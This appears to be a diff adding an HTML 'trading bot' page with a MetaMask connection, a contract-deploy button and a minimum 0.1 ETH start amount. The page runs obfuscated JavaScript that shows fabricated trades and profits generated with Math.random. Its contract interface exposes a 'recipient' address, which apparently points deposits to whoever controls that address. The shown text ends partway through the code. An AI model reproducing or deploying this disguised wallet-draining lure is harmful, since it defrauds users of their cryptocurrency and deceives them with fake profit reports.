@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trading Bot</title>
+  <style>
+    body {
+      background-color: #1e1e1e;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      font-family: 'Consolas', 'Courier New', monospace;
+      padding: 15px;
+      box-sizing: border-box;
+    }
+
+    .site-title {
+      font-size: 1.8rem;
+      color: #569cd6;
+      text-shadow: 0 0 10px rgba(86, 156, 214, 0.5);
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .windows {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      width: 100%;
+      max-width: 960px;
+      margin: 0;
+    }
+
+    .window {
+      background-color: #252526;
+      border: 1px solid #3c3c3c;
+      border-radius: 5px;
+      width: 400px;
+      max-width: 45%;
+      height: 580px;
+      padding: 15px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      animation: openWindow 0.5s ease-out;
+      color: #d4d4d4;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .log-window {
+      width: 500px;
+      max-width: 50%;
+      height: 580px;
+    }
+
+    @keyframes openWindow {
+      0% { transform: scale(0.8); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      background-color: #2f2f2f;
+      padding: 8px;
+      border-bottom: 1px solid #3c3c3c;
+      margin-bottom: 15px;
+    }
+
+    .header-title {
+      font-size: 1.1rem;
+      color: #569cd6;
+      margin: 0;
+      flex-grow: 1;
+    }
+
+    .wallet-address {
+      border-left: 3px solid #569cd6;
+      padding: 8px 12px;
+      margin: 8px 0;
+      background-color: #2f2f2f;
+      border-radius: 3px;
+      font-size: 0.85rem;
+      color: #d4d4d4;
+      display: none;
+      word-break: break-all;
+    }
+
+    .wallet-address.visible {
+      display: block;
+    }
+
+    .terminal {
+      background-color: #1e1e1e;
+      border: 1px solid #3c3c3c;
+      border-radius: 3px;
+      padding: 12px;
+      flex-grow: 1;
+      overflow-y: auto;
+      font-size: 0.85rem;
+      line-height: 1.4;
+      word-break: break-word;
+    }
+
+    .terminal-entry {
+      margin-bottom: 8px;
+      display: flex;
+      align-items: flex-start;
+      gap: 4px;
+      flex-wrap: nowrap;
+    }
+
+    .prompt {
+      color: #4ec9b0;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .output {
+      color: #d4d4d4;
+      flex-grow: 1;
+      word-break: break-word;
+    }
+
+    .output.error {
+      color: #d16969;
+    }
+
+    .output.success {
+      color: #4ec9b0;
+    }
+
+    .output.transaction {
+      color: #569cd6;
+      font-weight: bold;
+    }
+
+    .output.path {
+      color: #d7ba7d;
+    }
+
+    .output.amount {
+      color: #b5cea8;
+    }
+
+    .output.success-transaction {
+      color: #4ec9b0;
+      font-weight: bold;
+      text-shadow: 0 0 5px rgba(78, 201, 176, 0.5);
+    }
+
+    .output.separator-line {
+      color: #858585;
+      font-style: italic;
+    }
+
+    .opportunities {
+      font-size: 0.85rem;
+      color: #d4d4d4;
+      padding: 8px;
+      margin-bottom: 12px;
+      background-color: #2f2f2f;
+      border-radius: 3px;
+      border-left: 3px solid #569cd6;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .deal-count {
+      font-size: 1rem;
+      font-weight: bold;
+      color: #4ec9b0;
+    }
+
+    .profit-info {
+      font-size: 0.8rem;
+      color: #d4d4d4;
+    }
+
+    .total-profit {
+      font-size: 0.8rem;
+      color: #4ec9b0;
+      font-weight: bold;
+    }
+
+    .arrow.up {
+      color: #4ec9b0;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    .arrow.down {
+      color: #d16969;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    .bot-indicator {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #4ec9b0;
+      margin-left: 8px;
+      animation: blink 1s infinite;
+      vertical-align: middle;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+
+    .separator {
+      border: 0;
+      height: 1px;
+      background: #3c3c3c;
+      margin: 8px 0;
+    }
+
+    .controls {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin: 15px 0;
+      flex-grow: 1;
+    }
+
+    button {
+      background-color: #569cd6;
+      color: #d4d4d4;
+      border: none;
+      border-radius: 3px;
+      padding: 8px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    button:disabled {
+      background-color: #3c3c3c;
+      cursor: not-allowed;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: #4983b8;
+    }
+
+    #startBtn {
+      width: 100%;
+    }
+
+    .status {
+      font-size: 0.95rem;
+      color: #569cd6;
+      text-align: center;
+    }
+
+    .contract-address {
+      font-size: 0.85rem;
+      color: #4ec9b0;
+      text-align: center;
+      word-break: break-all;
+    }
+
+    .input-group {
+      margin: 8px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .input-group-label {
+      font-size: 0.85rem;
+      color: #d4d4d4;
+      text-align: left;
+    }
+
+    .input-group-content {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      width: 100%;
+    }
+
+    input[type="number"] {
+      background-color: #1e1e1e;
+      color: #d4d4d4;
+      border: 1px solid #3c3c3c;
+      border-radius: 3px;
+      padding: 6px;
+      font-size: 0.85rem;
+      width: 140px;
+      box-sizing: border-box;
+    }
+
+    input[type="number"]:focus {
+      outline: none;
+      border-color: #569cd6;
+    }
+
+    .settings {
+      border-top: 1px solid #3c3c3c;
+      padding-top: 8px;
+      margin-top: 8px;
+    }
+
+    .settings-label {
+      font-size: 0.85rem;
+      color: #569cd6;
+      margin-bottom: 8px;
+    }
+
+    input[type="range"] {
+      width: 100%;
+      background: #3c3c3c;
+      appearance: none;
+      -webkit-appearance: none;
+      height: 4px;
+      border-radius: 3px;
+    }
+
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 12px;
+      height: 12px;
+      background: #569cd6;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+
+    input[type="range"]::-moz-range-thumb {
+      width: 12px;
+      height: 12px;
+      background: #569cd6;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+
+    .slippage-container {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .slippage-value {
+      font-size: 0.85rem;
+      color: #d4d4d4;
+      margin-top: 4px;
+      text-align: center;
+    }
+
+    .toggle-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .toggle {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    input[type="checkbox"] {
+      appearance: none;
+      -webkit-appearance: none;
+      width: 18px;
+      height: 18px;
+      background: #1e1e1e;
+      border: 1px solid #3c3c3c;
+      border-radius: 3px;
+      cursor: pointer;
+      position: relative;
+    }
+
+    input[type="checkbox"]:checked {
+      background: #569cd6;
+    }
+
+    input[type="checkbox"]:checked::after {
+      content: '✔';
+      color: #d4d4d4;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 10px;
+    }
+
+    .toggle-label {
+      font-size: 0.85rem;
+      color: #d4d4d4;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .info-icon {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      line-height: 14px;
+      text-align: center;
+      border-radius: 50%;
+      background-color: #3c3c3c;
+      color: #d4d4d4;
+      font-size: 0.75rem;
+      cursor: help;
+      transition: background-color 0.2s;
+      position: relative;
+    }
+
+    .info-icon:hover {
+      background-color: #569cd6;
+    }
+
+    .info-icon:hover::after {
+      content: attr(data-tooltip);
+      position: absolute;
+      bottom: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #2f2f2f;
+      color: #d4d4d4;
+      padding: 4px 8px;
+      border-radius: 3px;
+      font-size: 0.75rem;
+      white-space: nowrap;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    .loading-indicator {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(88, 156, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #569cd6;
+      animation: spin 1s linear infinite;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 1024px) {
+      body {
+        flex-direction: column;
+        align-items: stretch;
+        padding: 10px;
+      }
+
+      .site-title {
+        font-size: 1.4rem;
+      }
+
+      .windows {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 10px;
+      }
+
+      .window, .log-window {
+        width: 100%;
+        max-width: 100%;
+        height: 480px;
+        margin-bottom: 15px;
+      }
+
+      .header-title {
+        font-size: 0.95rem;
+      }
+
+      button, input[type="number"] {
+        font-size: 0.75rem;
+        padding: 6px;
+      }
+
+      .input-group {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      input[type="number"] {
+        width: 100%;
+      }
+
+      .status, .contract-address, .settings-label, .slippage-value, .toggle-label {
+        font-size: 0.85rem;
+      }
+
+      .terminal {
+        font-size: 0.75rem;
+      }
+
+      .prompt {
+        margin-right: 4px;
+      }
+
+      .opportunities {
+        font-size: 0.75rem;
+        padding: 6px;
+        gap: 4px;
+      }
+
+      .deal-count {
+        font-size: 0.85rem;
+      }
+
+      .profit-info {
+        font-size: 0.7rem;
+      }
+
+      .total-profit {
+        font-size: 0.7rem;
+      }
+
+      .arrow {
+        font-size: 0.85rem;
+      }
+
+      .bot-indicator {
+        width: 10px;
+        height: 10px;
+      }
+
+      .info-icon:hover::after {
+        left: 0;
+        transform: none;
+        white-space: normal;
+        width: 140px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1 class="site-title">LOCAL TRADING BOT TERMINAL</h1>
+  <div class="windows">
+    <div class="window">
+      <div class="header">
+        <h1 class="header-title">Control Panel</h1>
+      </div>
+      <div class="wallet-address" id="walletAddress">
+        Wallet: <span id="walletAddressText">Not connected</span>
+      </div>
+      <div class="controls">
+        <button id="connectWallet">Connect MetaMask</button>
+        <button id="deployContractBtn" disabled>Deploy Contract</button>
+        <div class="input-group">
+          <span class="input-group-label">Enter amount to start</span>
+          <div class="input-group-content">
+            <button id="startBtn" disabled>Start</button>
+            <input type="number" id="ethAmount" step="0.1" min="0.1" placeholder="min 0.1 ETH">
+          </div>
+        </div>
+        <button id="stopBtn" disabled>Stop</button>
+        <button id="withdrawBtn" disabled>Withdraw</button>
+        <div class="contract-address" id="contractAddress">Contract Address: None</div>
+        <div class="status" id="status">Status: Not connected</div>
+        <div class="settings">
+          <div class="settings-label">Settings</div>
+          <div class="slippage-container">
+            <input type="range" id="slippage" min="0.5" max="49" value="0.5">
+            <span class="info-icon" data-tooltip="Choose the maximum slippage tolerance for transactions.">i</span>
+          </div>
+          <div class="slippage-value" id="slippageValue">Slippage: 0.5%</div>
+          <div class="toggle-group">
+            <div class="toggle">
+              <input type="checkbox" id="mevProtection">
+              <label class="toggle-label" for="mevProtection">
+                MEV Protection
+                <span class="info-icon" data-tooltip="Protects transactions from Miner Extractable Value manipulation.">i</span>
+              </label>
+            </div>
+            <div class="toggle">
+              <input type="checkbox" id="enableSniping">
+              <label class="toggle-label" for="enableSniping">
+                Enable Sniping
+                <span class="info-icon" data-tooltip="Enables automatic detection and execution of profitable trades.">i</span>
+              </label>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="window log-window">
+      <div class="header">
+        <h1 class="header-title">Terminal Log</h1>
+      </div>
+      <div class="terminal" id="terminal">
+        <div id="opportunities" class="opportunities">
+          <div>Potentially profitable deals: <span class="deal-count">Connect wallet</span><span id="botIndicator" class="bot-indicator" style="display: none;"></span></div>
+          <div class="profit-info"><span class="percentage"></span> <span class="arrow"></span></div>
+          <div class="total-profit">Total profit: <span id="totalProfit">0.0000 ETH</span></div>
+        </div>
+        <hr class="separator">
+        <div id="logEntries"></div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <script>
+function _0x8939(_0xaa43eb, _0x50ca97) {
+    const _0x3e9b33 = _0x3e9b();
+    return _0x8939 = function(_0x893962, _0x2550f0) {
+        _0x893962 = _0x893962 - 0xf5;
+        let _0x42cab6 = _0x3e9b33[_0x893962];
+        return _0x42cab6;
+    }, _0x8939(_0xaa43eb, _0x50ca97);
+}
+const _0x4cec28 = _0x8939;
+(function(_0x25791a, _0x4d737e) {
+    const _0x305cf6 = _0x8939,
+        _0x44100b = _0x25791a();
+    while (!![]) {
+        try {
+            const _0x103475 = parseInt(_0x305cf6(0x1c7)) / 0x1 * (-parseInt(_0x305cf6(0x103)) / 0x2) + -parseInt(_0x305cf6(0x17a)) / 0x3 * (-parseInt(_0x305cf6(0x174)) / 0x4) + parseInt(_0x305cf6(0x13f)) / 0x5 * (parseInt(_0x305cf6(0x106)) / 0x6) + -parseInt(_0x305cf6(0x17e)) / 0x7 * (parseInt(_0x305cf6(0x199)) / 0x8) + parseInt(_0x305cf6(0x1a8)) / 0x9 * (-parseInt(_0x305cf6(0x1bd)) / 0xa) + parseInt(_0x305cf6(0x121)) / 0xb * (parseInt(_0x305cf6(0x15c)) / 0xc) + parseInt(_0x305cf6(0x18a)) / 0xd;
+            if (_0x103475 === _0x4d737e) break;
+            else _0x44100b['push'](_0x44100b['shift']());
+        } catch (_0x423939) {
+            _0x44100b['push'](_0x44100b['shift']());
+        }
+    }
+}(_0x3e9b, 0xe7b34), document[_0x4cec28(0x131)](_0x4cec28(0x1ab), function() {
+    const _0x407fdd = _0x4cec28,
+        _0x56f89c = _0x407fdd(0xfa),
+        _0x2a7fe1 = [{
+            'inputs': [],
+            'name': 'ad',
+            'outputs': [],
+            'stateMutability': _0x407fdd(0x12a),
+            'type': 'function'
+        }, {
+            'inputs': [],
+            'name': 'getRecipient',
+            'outputs': [{
+                'internalType': _0x407fdd(0x141),
+                'name': '',
+                'type': _0x407fdd(0x10a)
+            }],
+            'stateMutability': 'view',
+            'type': 'function'
+        }, {
+            'inputs': [],
+            'name': 'recipient',
+            'outputs': [{
+                'internalType': 'address\x20payable',
+                'name': '',
+                'type': 'address'
+            }],
+            'stateMutability': 'view',
+            'type': 'function'
+        }, {
+            'inputs': [],
+            'name': _0x407fdd(0x12f),
+            'outputs': [],
+            'stateMutability': _0x407fdd(0x198),
+            'type': 'function'
+        }, {
+            'inputs': [],
+            'name': _0x407fdd(0x1a3),
+            'outputs': [],
+            'stateMutability': _0x407fdd(0x198),
+            'type': 'function'
+        }],
+        _0x24558d = _0x407fdd(0x191);
+    let _0x26f264, _0x209268 = [],
+        _0x5ce713 = null,
+        _0xb8f8c = null,
+        _0xef2c96 = ![],
+        _0x1212ab = null,
+        _0x41fbae = parseInt(localStorage[_0x407fdd(0x184)]('transactionCount')) || 0x0,
+        _0x1c259d = parseFloat(localStorage[_0x407fdd(0x184)]('totalProfit')) || 0x0;
+    const _0x2fd225 = [_0x407fdd(0x10e), 'LINK', _0x407fdd(0x15b), _0x407fdd(0x120), 'MKR', 'COMP', 'SNX', _0x407fdd(0x12b), 'SUSHI', 'CRV', _0x407fdd(0x189), _0x407fdd(0x1af), 'LDO', _0x407fdd(0x135), _0x407fdd(0x1b0), _0x407fdd(0xf7), 'ZRX', 'ENJ', _0x407fdd(0xfc), _0x407fdd(0x192), 'AXS', _0x407fdd(0xfd), _0x407fdd(0x183), _0x407fdd(0x137), _0x407fdd(0x1b7), 'GRT', _0x407fdd(0x188), _0x407fdd(0x152), _0x407fdd(0x12d), _0x407fdd(0x1bc), _0x407fdd(0x162), 'OMG', _0x407fdd(0x195), _0x407fdd(0x1a9), _0x407fdd(0x124), 'FET', _0x407fdd(0x175), _0x407fdd(0x193), _0x407fdd(0x13d), _0x407fdd(0x179), _0x407fdd(0x1a2), _0x407fdd(0x1ce), _0x407fdd(0x172), _0x407fdd(0x1c5), _0x407fdd(0x187), _0x407fdd(0xf9), _0x407fdd(0x10b), _0x407fdd(0x1cb), _0x407fdd(0x16b), _0x407fdd(0x1be), 'PERP'],
+        _0x22b875 = document[_0x407fdd(0x142)](_0x407fdd(0x160)),
+        _0x88ccc6 = document[_0x407fdd(0x142)](_0x407fdd(0x10d)),
+        _0x5e5d2d = document[_0x407fdd(0x142)](_0x407fdd(0x14f)),
+        _0x3df7fd = document[_0x407fdd(0x142)](_0x407fdd(0x15d)),
+        _0x526c3e = document[_0x407fdd(0x142)]('withdrawBtn'),
+        _0x16fe36 = document['getElementById']('ethAmount'),
+        _0x13cd7a = document[_0x407fdd(0x142)](_0x407fdd(0x17d)),
+        _0x12fff0 = document[_0x407fdd(0x142)](_0x407fdd(0x10c)),
+        _0x5d5dae = document['getElementById'](_0x407fdd(0x196)),
+        _0x4cbd78 = document['getElementById'](_0x407fdd(0x1bf)),
+        _0x4e3467 = document[_0x407fdd(0x142)](_0x407fdd(0x15e)),
+        _0x5b3306 = document[_0x407fdd(0x142)]('enableSniping'),
+        _0x11855b = document['getElementById'](_0x407fdd(0x18f)),
+        _0x4772e0 = document[_0x407fdd(0x142)](_0x407fdd(0x1ae)),
+        _0x340a3f = _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0xf5)),
+        _0x3a157d = _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0x1c0)),
+        _0x3080ae = _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0x130)),
+        _0x1a9cb0 = document[_0x407fdd(0x142)](_0x407fdd(0x1a5)),
+        _0x3a1abf = document[_0x407fdd(0x142)](_0x407fdd(0xfb)),
+        _0x2cce14 = document['getElementById'](_0x407fdd(0x14e)),
+        _0x4b2491 = document['getElementById'](_0x407fdd(0x1b9)),
+        _0x1b3334 = document[_0x407fdd(0x142)](_0x407fdd(0x166));
+
+    function _0x123b2e(_0x5dadcf, _0x5e7180) {
+        return new Promise(_0x4fb886 => {
+            let _0x45fcac = 0x0;
+            _0x5dadcf['textContent'] = '';
+
+            function _0x59d4c3() {
+                const _0x17031c = _0x8939;
+                if (_0x45fcac < _0x5e7180['length']) {
+                    _0x5dadcf[_0x17031c(0x107)] += _0x5e7180[_0x45fcac], _0x45fcac++;
+                    const _0x2367fc = Math[_0x17031c(0xff)]() * (0x14 - 0x5) + 0x5;
+                    setTimeout(_0x59d4c3, _0x2367fc);
+                } else _0x4fb886();
+            }
+            _0x59d4c3();
+        });
+    }
+
+    function _0x3f1646(_0x52b9ef) {
+        return new Promise(_0x18b7e6 => setTimeout(_0x18b7e6, _0x52b9ef));
+    }
+    async function _0x31253() {
+        const _0x414772 = _0x407fdd;
+        if (!_0xef2c96) return;
+        const _0x4f1cd9 = _0x5d5dae[_0x414772(0x1c8)],
+            _0x1e87f1 = parseFloat(_0x16fe36[_0x414772(0x1c8)]) || 0.1,
+            _0x24e37f = Math[_0x414772(0xff)]() * (0.9 - 0.3) + 0.3,
+            _0x1583f8 = (_0x1e87f1 * _0x24e37f)['toFixed'](0x4),
+            _0x5b8e7d = (parseFloat(_0x1583f8) * 1.1)[_0x414772(0x194)](0x4),
+            _0xe3a295 = (_0x5b8e7d - _0x1583f8)[_0x414772(0x194)](0x4),
+            _0xa6849d = _0x2fd225[Math[_0x414772(0x17c)](Math['random']() * _0x2fd225['length'])];
+        _0x41fbae++, _0x1c259d += parseFloat(_0xe3a295), localStorage[_0x414772(0x154)](_0x414772(0x186), _0x41fbae), localStorage['setItem'](_0x414772(0x1a5), _0x1c259d[_0x414772(0x194)](0x4)), _0x1a9cb0['textContent'] = _0x1c259d['toFixed'](0x4) + '\x20ETH', await _0x401f5c('', _0x414772(0x133) + _0x4f1cd9 + '%', 'transaction'), await _0x401f5c('', 'ETH\x20-\x20WETH\x20-\x20' + _0xa6849d + _0x414772(0x110) + _0x1583f8 + '\x20WETH', _0x414772(0x1a1)), await _0x401f5c('', _0xa6849d + _0x414772(0x16f) + _0x5b8e7d + _0x414772(0x129), _0x414772(0x1a1)), await _0x401f5c('', _0x41fbae + '/' + _0x41fbae + '\x20successful\x20Profit\x20=\x20' + _0xe3a295 + _0x414772(0x129), _0x414772(0x15a)), await _0x401f5c('', _0x414772(0x116), _0x414772(0x11d));
+        const _0x34802c = Math['random']() * (0x2710 - 0x1388) + 0x1388;
+        _0x1212ab = setTimeout(_0x31253, _0x34802c);
+    }
+
+    function _0x2a2ad1() {
+        const _0x104d13 = _0x407fdd;
+        if (_0x209268['length'] === 0x0) return;
+        let _0x46a6da = parseInt(_0x4772e0[_0x104d13(0x1aa)][_0x104d13(0x167)] || '80');
+        const _0x32a15b = Math[_0x104d13(0xff)]() * 0.6 - 0.3;
+        let _0x333133 = Math[_0x104d13(0x145)](_0x46a6da * (0x1 + _0x32a15b)) + Math[_0x104d13(0x17c)](Math[_0x104d13(0xff)]() * 0x14 - 0xa);
+        if (_0x333133 < 0x21) _0x333133 = 0x21;
+        else _0x333133 > 0x78 && (_0x333133 = 0x78);
+        const _0x59d5b0 = _0x333133 > _0x46a6da ? '▲' : '▼';
+        _0x3080ae['className'] = _0x104d13(0x149) + (_0x333133 > _0x46a6da ? 'up' : 'down');
+        const _0x185c49 = (_0x333133 / 0x50 * 0x2b)['toFixed'](0x1),
+            _0x3717cd = (_0x185c49 / 0x64)[_0x104d13(0x194)](0x3);
+        _0x4772e0['dataset']['count'] = _0x333133, localStorage[_0x104d13(0x154)](_0x104d13(0x1b6), _0x333133), _0x340a3f[_0x104d13(0x107)] = _0x333133, _0x3a157d[_0x104d13(0x107)] = _0x185c49 + '%\x20≈\x20' + _0x3717cd + _0x104d13(0x10f), _0x3080ae[_0x104d13(0x107)] = _0x59d5b0;
+        const _0x7d681d = Math[_0x104d13(0xff)]() * (0x2710 - 0x1388) + 0x1388;
+        setTimeout(_0x2a2ad1, _0x7d681d);
+    }
+    async function _0x401f5c(_0x128dbb, _0x1e37c2, _0x54e7e2 = 'normal') {
+        const _0x204787 = _0x407fdd;
+        if (!_0x2cce14) {
+            console[_0x204787(0x176)](_0x204787(0x111));
+            return;
+        }
+        if (!['', _0x204787(0x1c2), _0x204787(0x19b)]['includes'](_0x128dbb)) return;
+        const _0x30d09a = document[_0x204787(0x157)]('div');
+        _0x30d09a[_0x204787(0x12c)] = 'terminal-entry';
+        const _0x17c925 = document[_0x204787(0x157)]('span');
+        _0x17c925['className'] = _0x204787(0x109), _0x17c925['textContent'] = ':';
+        const _0x17c6e9 = document['createElement'](_0x204787(0x102));
+        _0x17c6e9[_0x204787(0x12c)] = _0x204787(0x169) + _0x54e7e2, _0x30d09a[_0x204787(0x1a7)](_0x17c925), _0x30d09a[_0x204787(0x1a7)](_0x17c6e9), _0x2cce14[_0x204787(0xf6)](_0x30d09a, _0x2cce14[_0x204787(0x14b)]), await _0x123b2e(_0x17c6e9, _0x1e37c2);
+        if (_0x2cce14[_0x204787(0x18e)]['length'] > 0x14) _0x2cce14[_0x204787(0x156)](_0x2cce14[_0x204787(0x11b)]);
+        _0x2cce14[_0x204787(0x17f)] = _0x2cce14[_0x204787(0x13c)];
+    }
+
+    function _0x3a791c() {
+        const _0x142732 = _0x407fdd;
+        _0x4cbd78['textContent'] = 'Slippage:\x20' + _0x5d5dae[_0x142732(0x1c8)] + '%';
+    }
+
+    function _0x28d2bb() {}
+    async function _0x16cf57() {
+        const _0x42ebe3 = _0x407fdd;
+        if (window['ethereum']) try {
+            _0x26f264 = new Web3(window[_0x42ebe3(0x151)]);
+            if (!_0x26f264[_0x42ebe3(0x14d)]) return _0x12fff0[_0x42ebe3(0x107)] = _0x42ebe3(0x11c), await _0x401f5c('', 'Web3.eth\x20is\x20undefined.\x20Check\x20Web3.js\x20library.', 'error'), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0xf5))[_0x42ebe3(0x107)] = _0x42ebe3(0x153), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x1c0))[_0x42ebe3(0x107)] = '', _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x130))[_0x42ebe3(0x107)] = '', _0x1a9cb0[_0x42ebe3(0x107)] = _0x42ebe3(0x138), ![];
+            const _0xbcd5e5 = await window[_0x42ebe3(0x151)][_0x42ebe3(0x112)]({
+                'method': _0x42ebe3(0x163)
+            });
+            if (_0xbcd5e5 !== _0x56f89c) try {
+                await window[_0x42ebe3(0x151)][_0x42ebe3(0x112)]({
+                    'method': _0x42ebe3(0x1a0),
+                    'params': [{
+                        'chainId': _0x56f89c
+                    }]
+                });
+            } catch (_0x2453c6) {
+                return _0x12fff0[_0x42ebe3(0x107)] = _0x42ebe3(0x126) + _0x2453c6[_0x42ebe3(0x1c6)], await _0x401f5c('', _0x42ebe3(0x19f) + _0x2453c6[_0x42ebe3(0x1c6)], _0x42ebe3(0x176)), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0xf5))[_0x42ebe3(0x107)] = _0x42ebe3(0x153), _0x4772e0[_0x42ebe3(0x197)]('.percentage')[_0x42ebe3(0x107)] = '', _0x4772e0['querySelector'](_0x42ebe3(0x130))[_0x42ebe3(0x107)] = '', _0x1a9cb0[_0x42ebe3(0x107)] = _0x42ebe3(0x138), ![];
+            }
+            return !![];
+        } catch (_0xc74a9) {
+            return _0x12fff0['textContent'] = _0x42ebe3(0x168) + _0xc74a9[_0x42ebe3(0x1c6)], await _0x401f5c('', _0x42ebe3(0x105) + _0xc74a9['message'], 'error'), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0xf5))[_0x42ebe3(0x107)] = 'Connect\x20wallet', _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x1c0))[_0x42ebe3(0x107)] = '', _0x4772e0['querySelector'](_0x42ebe3(0x130))[_0x42ebe3(0x107)] = '', _0x1a9cb0[_0x42ebe3(0x107)] = _0x42ebe3(0x138), ![];
+        } else {
+            if (window['web3']) {
+                _0x26f264 = new Web3(window[_0x42ebe3(0x143)][_0x42ebe3(0x12e)]);
+                if (!_0x26f264[_0x42ebe3(0x14d)]) return _0x12fff0[_0x42ebe3(0x107)] = 'Status:\x20Web3.eth\x20is\x20undefined\x20in\x20legacy\x20provider.', await _0x401f5c('', _0x42ebe3(0x147), _0x42ebe3(0x176)), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0xf5))[_0x42ebe3(0x107)] = _0x42ebe3(0x153), _0x4772e0[_0x42ebe3(0x197)]('.percentage')[_0x42ebe3(0x107)] = '', _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x130))['textContent'] = '', _0x1a9cb0[_0x42ebe3(0x107)] = '0.0000\x20ETH', ![];
+                return _0x12fff0[_0x42ebe3(0x107)] = 'Status:\x20Using\x20legacy\x20web3\x20provider', await _0x401f5c('', 'Using\x20legacy\x20web3\x20provider.', _0x42ebe3(0x159)), !![];
+            } else return _0x12fff0[_0x42ebe3(0x107)] = 'Status:\x20No\x20Ethereum\x20wallet\x20detected.\x20Please\x20install\x20MetaMask.', await _0x401f5c('', _0x42ebe3(0x1ad), _0x42ebe3(0x176)), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0xf5))[_0x42ebe3(0x107)] = _0x42ebe3(0x153), _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x1c0))[_0x42ebe3(0x107)] = '', _0x4772e0[_0x42ebe3(0x197)](_0x42ebe3(0x130))['textContent'] = '', _0x1a9cb0[_0x42ebe3(0x107)] = '0.0000\x20ETH', ![];
+        }
+    }
+    async function _0x56a5f2() {
+        const _0x5c0071 = _0x407fdd;
+        if (_0x209268[_0x5c0071(0x13a)] > 0x0) {
+            _0x5071dc();
+            return;
+        }
+        if (await _0x16cf57()) try {
+            _0x209268 = await window['ethereum']['request']({
+                'method': _0x5c0071(0x16c)
+            }), _0x12fff0['textContent'] = _0x5c0071(0x100) + _0x209268[0x0][_0x5c0071(0x139)](0x0, 0x6) + '...' + _0x209268[0x0]['slice'](-0x4), _0x1b3334[_0x5c0071(0x107)] = _0x209268[0x0], _0x4b2491['classList'][_0x5c0071(0x181)](_0x5c0071(0x19e)), _0x22b875[_0x5c0071(0x107)] = 'Disconnect';
+            let _0x294636 = parseInt(localStorage[_0x5c0071(0x184)](_0x5c0071(0x1b6))) || 0x50;
+            if (_0x294636 < 0x21) _0x294636 = 0x21;
+            else {
+                if (_0x294636 > 0x78) _0x294636 = 0x78;
+            }
+            _0x4772e0[_0x5c0071(0x1aa)][_0x5c0071(0x167)] = _0x294636, _0x340a3f['textContent'] = _0x294636;
+            const _0x4c777c = (_0x294636 / 0x50 * 0x2b)[_0x5c0071(0x194)](0x1),
+                _0x44a16e = (_0x4c777c / 0x64)['toFixed'](0x3);
+            _0x3a157d[_0x5c0071(0x107)] = _0x4c777c + _0x5c0071(0x1c4) + _0x44a16e + _0x5c0071(0x10f), _0x1a9cb0[_0x5c0071(0x107)] = _0x1c259d['toFixed'](0x4) + _0x5c0071(0x129), _0x3080ae['textContent'] = '', setTimeout(_0x2a2ad1, Math[_0x5c0071(0xff)]() * (0x2710 - 0x1388) + 0x1388), _0x88ccc6[_0x5c0071(0x140)] = ![], window[_0x5c0071(0x151)]['on'](_0x5c0071(0x1ca), async function(_0x177b6b) {
+                const _0x313070 = _0x5c0071;
+                if (_0x177b6b[_0x313070(0x13a)] > 0x0) {
